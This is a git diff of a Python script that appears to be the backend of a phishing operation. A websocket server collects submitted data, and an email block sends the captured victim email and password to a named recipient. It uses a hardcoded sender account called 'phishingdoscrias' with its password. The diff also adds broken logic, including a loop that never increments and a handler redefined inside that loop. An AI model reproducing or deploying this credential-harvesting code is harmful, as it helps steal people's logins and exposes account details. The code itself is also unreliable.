@@ -5,18 +5,22 @@ from email.mime.multipart import MIMEMultipart
 import asyncio
 import websockets
 
-async def receive_data(websocket, path):
-    data = await websocket.recv()
-    print("Received data:", data)
-    # Process the data as needed
-    response = "Data received successfully"
-    await websocket.send(response)
+x=0
+data= []
+print("rodando")
+while x<2:
+    async def receive_data(websocket, path):
+        data = await websocket.recv()
+        print("Received data:", data[x])
+        # Process the data as needed
+        response = "Data received successfully"
+        await websocket.send(response)
+    x=+1
 
-start_server = websockets.serve(receive_data, "localhost", 8765)
+start_server = websockets.serve(receive_data, "localhost", 3002)
 
 asyncio.get_event_loop().run_until_complete(start_server)
 asyncio.get_event_loop().run_forever()
-
 
 # Email configuration
 sender_email = "phishingdoscrias@hotmail.com"
@@ -24,8 +28,8 @@ receiver_email = "guilherme.barnabe@estudante.ifms.edu.br"
 password = "phishing123@"
 
 # Create the email message
-subject = "Pegamo um véio"
-body = "Email do véio: {email}<br> Senha do véio: {senha}"
+subject = "Pegamo um véio" 
+body = "Email do véio: {data[0]}<br> Senha do véio: {data[1]}"
 message = MIMEMultipart()
 message['From'] = sender_email
 message['To'] = receiver_email
